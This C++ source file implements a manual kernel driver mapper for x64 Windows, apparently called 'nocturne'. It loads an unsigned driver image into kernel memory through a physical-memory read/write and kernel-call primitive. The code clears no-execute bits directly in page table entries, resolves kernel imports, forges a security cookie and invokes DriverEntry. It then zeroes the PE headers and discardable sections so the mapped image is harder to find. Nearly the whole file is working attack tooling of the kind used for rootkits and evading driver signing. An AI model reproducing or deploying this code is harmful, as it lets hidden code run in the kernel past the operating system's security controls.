#include "../include/pe_loader.hpp"
#include <fstream>
#include <iostream>

namespace nocturne {

PeLoader::PeLoader(CarrierIo& io, const MapperConfig& cfg) : m_io(io), m_cfg(cfg) {}

bool PeLoader::LoadFileToMemory(const std::wstring& filePath, std::vector<uint8_t>& outBytes) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return false;
    auto fileSize = file.tellg();
    if (fileSize < sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS64)) return false;
    outBytes.resize(static_cast<size_t>(fileSize));
    file.seekg(0, std::ios::beg);
    file.read(reinterpret_cast<char*>(outBytes.data()), fileSize);
    return true;
}

bool PeLoader::ValidatePe64(const std::vector<uint8_t>& rawBytes, IMAGE_NT_HEADERS64*& outNtHeaders) {
    if (rawBytes.size() < sizeof(IMAGE_DOS_HEADER)) return false;
    auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(rawBytes.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    if (static_cast<size_t>(dos->e_lfanew) + sizeof(IMAGE_NT_HEADERS64) > rawBytes.size()) return false;

    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(const_cast<uint8_t*>(rawBytes.data() + dos->e_lfanew));
    if (nt->Signature != IMAGE_NT_SIGNATURE || nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return false;
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return false;
    outNtHeaders = nt;
    return true;
}

bool PeLoader::MakeRegionExecutable(uint64_t baseAddr, uint32_t size) {
    for (uint32_t offset = 0; offset < size; offset += 0x1000) {
        uint64_t pageVa = baseAddr + offset;
        uint64_t ptePhys = 0;
        if (!m_io.TranslateLinearAddress(m_io.SystemCr3(), pageVa, &ptePhys) || !ptePhys) {
            return false;
        }
        PageTableEntry pte{};
        if (!m_io.ReadPhysical(ptePhys, &pte.value, sizeof(uint64_t))) return false;
        pte.noExecute = 0;
        pte.readWrite = 1;
        if (!m_io.WritePhysical(ptePhys, &pte.value, sizeof(uint64_t))) return false;
    }
    return true;
}

uint64_t PeLoader::AllocateKernelMemory(uint32_t size, bool& outUsedIndependentPages) {
    outUsedIndependentPages = false;
    uint32_t alignedSize = (size + 0xFFFU) & ~0xFFFU;

    // 1. Primary: Exported MmAllocateContiguousMemory (2 register args: RCX=NumberOfBytes, RDX=HighestAcceptableAddress)
    // Allocates independent contiguous physical pages outside ExAllocatePool / BigPool table, 100% exported on all Win10/11 builds
    if (m_cfg.useIndependentPages) {
        uint64_t fnAllocContig = m_io.GetKernelModuleExport(m_io.NtoskrnlBase(), "MmAllocateContiguousMemory");
        if (fnAllocContig) {
            uint64_t highestPhys = 0xFFFFFFFFFFFFFFFFULL;
            uint64_t allocatedBase = 0;
            if (m_io.CallKernelFunction(&allocatedBase, fnAllocContig, static_cast<uint64_t>(alignedSize), highestPhys) && allocatedBase != 0) {
                if (MakeRegionExecutable(allocatedBase, alignedSize)) {
                    outUsedIndependentPages = true;
                    return allocatedBase;
                }
            }
        }
    }

    // 2. Fallback: Exported ExAllocatePoolWithTag(NonPagedPoolExecute, alignedSize, m_cfg.poolTag) (3 register args: RCX, RDX, R8) + PTE NX-bit clear
    uint64_t exAllocPool = m_io.GetKernelModuleExport(m_io.NtoskrnlBase(), "ExAllocatePoolWithTag");
    if (!exAllocPool) return 0;

    uint64_t poolBase = 0;
    constexpr uint32_t NonPagedPoolExecute = 0;
    if (!m_io.CallKernelFunction(&poolBase, exAllocPool, NonPagedPoolExecute, static_cast<uint64_t>(alignedSize), m_cfg.poolTag) || !poolBase) {
        return 0;
    }
    MakeRegionExecutable(poolBase, alignedSize);
    return poolBase;
}

bool PeLoader::FreeKernelMemory(uint64_t baseAddr, uint32_t size, bool usedIndependentPages) {
    (void)size;
    if (!baseAddr) return false;
    if (usedIndependentPages) {
        uint64_t fnFreeContig = m_io.GetKernelModuleExport(m_io.NtoskrnlBase(), "MmFreeContiguousMemory");
        if (!fnFreeContig) return false;
        uint64_t dummy = 0;
        return m_io.CallKernelFunction(&dummy, fnFreeContig, baseAddr);
    }
    uint64_t exFreePool = m_io.GetKernelModuleExport(m_io.NtoskrnlBase(), "ExFreePoolWithTag");
    if (!exFreePool) return false;
    uint64_t dummyRet = 0;
    return m_io.CallKernelFunction(&dummyRet, exFreePool, baseAddr, m_cfg.poolTag);
}

bool PeLoader::ProcessRelocations(uint8_t* localImageBase, uint64_t remoteKernelBase, IMAGE_NT_HEADERS64* ntHeaders) {
    const auto& relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    int64_t delta = static_cast<int64_t>(remoteKernelBase - ntHeaders->OptionalHeader.ImageBase);
    if (delta == 0) return true;

    if (!relocDir.VirtualAddress || !relocDir.Size) {
        return (ntHeaders->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) == 0;
    }

    auto* relocBlock = reinterpret_cast<IMAGE_BASE_RELOCATION*>(localImageBase + relocDir.VirtualAddress);
    const auto* relocEnd = reinterpret_cast<const uint8_t*>(relocBlock) + relocDir.Size;

    while (reinterpret_cast<const uint8_t*>(relocBlock) < relocEnd && relocBlock->VirtualAddress && relocBlock->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
        uint32_t count = (relocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);
        auto* entries = reinterpret_cast<uint16_t*>(relocBlock + 1);

        for (uint32_t i = 0; i < count; ++i) {
            uint16_t type = entries[i] >> 12;
            uint16_t offset = entries[i] & 0xFFF;
            uint8_t* target = localImageBase + relocBlock->VirtualAddress + offset;

            if (type == IMAGE_REL_BASED_DIR64) {
                *reinterpret_cast<uint64_t*>(target) += delta;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                *reinterpret_cast<uint32_t*>(target) += static_cast<uint32_t>(delta);
            }
        }
        relocBlock = reinterpret_cast<IMAGE_BASE_RELOCATION*>(reinterpret_cast<uint8_t*>(relocBlock) + relocBlock->SizeOfBlock);
    }
    return true;
}

bool PeLoader::ResolveImports(uint8_t* localImageBase, IMAGE_NT_HEADERS64* ntHeaders) {
    const auto& importDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!importDir.VirtualAddress || !importDir.Size) return true;

    auto* importDesc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(localImageBase + importDir.VirtualAddress);
    while (importDesc->Name) {
        const char* modName = reinterpret_cast<const char*>(localImageBase + importDesc->Name);
        uint64_t modBase = m_io.GetKernelModuleBase(modName);
        if (!modBase) {
            std::cerr << "[-] Unresolved kernel dependency module: " << modName << "\n";
            return false;
        }

        auto* origThunk = reinterpret_cast<IMAGE_THUNK_DATA64*>(localImageBase + (importDesc->OriginalFirstThunk ? importDesc->OriginalFirstThunk : importDesc->FirstThunk));
        auto* firstThunk = reinterpret_cast<IMAGE_THUNK_DATA64*>(localImageBase + importDesc->FirstThunk);

        while (origThunk->u1.AddressOfData) {
            if (IMAGE_SNAP_BY_ORDINAL64(origThunk->u1.Ordinal)) {
                std::cerr << "[-] Ordinal imports are not supported in kernel modules\n";
                return false;
            }
            auto* byName = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(localImageBase + origThunk->u1.AddressOfData);
            uint64_t fnAddr = m_io.GetKernelModuleExport(modBase, byName->Name);
            if (!fnAddr) {
                std::cerr << "[-] Failed to resolve import: " << modName << "!" << byName->Name << "\n";
                return false;
            }
            firstThunk->u1.Function = fnAddr;
            ++origThunk;
            ++firstThunk;
        }
        ++importDesc;
    }
    return true;
}

void PeLoader::InitializeSecurityCookie(uint8_t* localImageBase, uint64_t remoteKernelBase, IMAGE_NT_HEADERS64* ntHeaders) {
    const auto& loadCfgDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];
    if (!loadCfgDir.VirtualAddress || loadCfgDir.Size < offsetof(IMAGE_LOAD_CONFIG_DIRECTORY64, SecurityCookie) + sizeof(uint64_t)) {
        return;
    }
    auto* loadCfg = reinterpret_cast<IMAGE_LOAD_CONFIG_DIRECTORY64*>(localImageBase + loadCfgDir.VirtualAddress);
    if (!loadCfg->SecurityCookie) return;

    int64_t delta = static_cast<int64_t>(remoteKernelBase - ntHeaders->OptionalHeader.ImageBase);
    uint64_t cookieRva = (loadCfg->SecurityCookie - delta) - ntHeaders->OptionalHeader.ImageBase;
    if (cookieRva < ntHeaders->OptionalHeader.SizeOfImage - sizeof(uint64_t)) {
        uint64_t newCookie = (remoteKernelBase ^ static_cast<uint64_t>(GetCurrentProcessId()) ^ GetTickCount64()) | 0x00002B992DDFA232ULL;
        if (newCookie == 0x2B992DDFA232ULL) ++newCookie;
        *reinterpret_cast<uint64_t*>(localImageBase + cookieRva) = newCookie;
    }
}

void PeLoader::ScrubDiscardableAndHeaders(uint8_t* localImageBase, uint64_t remoteKernelBase, IMAGE_NT_HEADERS64* ntHeaders) {
    if (!m_cfg.scrubHeaders) return;

    uint32_t headerSize = ntHeaders->OptionalHeader.SizeOfHeaders;
    std::vector<uint8_t> zeros(headerSize, 0);
    m_io.WriteKernelVirtual(remoteKernelBase, zeros.data(), headerSize);

    auto* sec = IMAGE_FIRST_SECTION(ntHeaders);
    for (uint16_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++sec) {
        char secName[9] = {};
        memcpy(secName, sec->Name, 8);
        bool isDiscardable = (sec->Characteristics & IMAGE_SCN_MEM_DISCARDABLE) != 0 ||
                             strcmp(secName, ".reloc") == 0 ||
                             strcmp(secName, ".pdata") == 0 ||
                             strcmp(secName, "INIT") == 0;
        if (isDiscardable && sec->Misc.VirtualSize > 0) {
            std::vector<uint8_t> secZeros(sec->Misc.VirtualSize, 0);
            m_io.WriteKernelVirtual(remoteKernelBase + sec->VirtualAddress, secZeros.data(), secZeros.size());
        }
    }
}

bool PeLoader::MapDriver(const std::vector<uint8_t>& rawPeBytes, uint64_t param1, uint64_t param2, MappedImageInfo& outInfo) {
    IMAGE_NT_HEADERS64* ntHeaders = nullptr;
    if (!ValidatePe64(rawPeBytes, ntHeaders)) {
        std::cerr << "Invalid x64 PE image\n";
        return false;
    }

    uint32_t imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    std::vector<uint8_t> localImage(imageSize, 0);

    // Copy headers & sections to local virtual staging buffer
    memcpy(localImage.data(), rawPeBytes.data(), ntHeaders->OptionalHeader.SizeOfHeaders);
    auto* sec = IMAGE_FIRST_SECTION(ntHeaders);
    for (uint16_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++sec) {
        if (sec->SizeOfRawData > 0) {
            memcpy(localImage.data() + sec->VirtualAddress, rawPeBytes.data() + sec->PointerToRawData, sec->SizeOfRawData);
        }
    }

    auto* stagedNt = reinterpret_cast<IMAGE_NT_HEADERS64*>(localImage.data() + reinterpret_cast<const IMAGE_DOS_HEADER*>(localImage.data())->e_lfanew);

    bool usedIndep = false;
    uint64_t kernelBase = AllocateKernelMemory(imageSize, usedIndep);
    if (!kernelBase) {
        std::cerr << "Failed to allocate kernel memory for payload\n";
        return false;
    }

    if (!ProcessRelocations(localImage.data(), kernelBase, stagedNt) ||
        !ResolveImports(localImage.data(), stagedNt)) {
        FreeKernelMemory(kernelBase, imageSize, usedIndep);
        return false;
    }

    InitializeSecurityCookie(localImage.data(), kernelBase, stagedNt);

    if (!m_io.WriteKernelVirtual(kernelBase, localImage.data(), imageSize)) {
        std::cerr << "Failed to project mapped sections into kernel space\n";
        FreeKernelMemory(kernelBase, imageSize, usedIndep);
        return false;
    }

    uint64_t entryPointVa = kernelBase + stagedNt->OptionalHeader.AddressOfEntryPoint;
    NTSTATUS status = 0;
    if (stagedNt->OptionalHeader.AddressOfEntryPoint != 0) {
        if (!m_io.CallKernelFunction(&status, entryPointVa, param1 ? param1 : kernelBase, param2 ? param2 : static_cast<uint64_t>(imageSize))) {
            std::cerr << "Failed to invoke mapped DriverEntry\n";
            FreeKernelMemory(kernelBase, imageSize, usedIndep);
            return false;
        }
    }

    // Harvest optional Ring 0 hardware proof stamped at +0x300 before scrubbing the PE header page
    m_io.ReadVal(kernelBase + 0x300, outInfo.ring0Proof);

    ScrubDiscardableAndHeaders(localImage.data(), kernelBase, stagedNt);

    outInfo.kernelBase = kernelBase;
    outInfo.imageSize = imageSize;
    outInfo.entryPointRva = stagedNt->OptionalHeader.AddressOfEntryPoint;
    outInfo.entryStatus = status;
    outInfo.usedIndependentPages = usedIndep;
    return true;
}

} // namespace nocturne
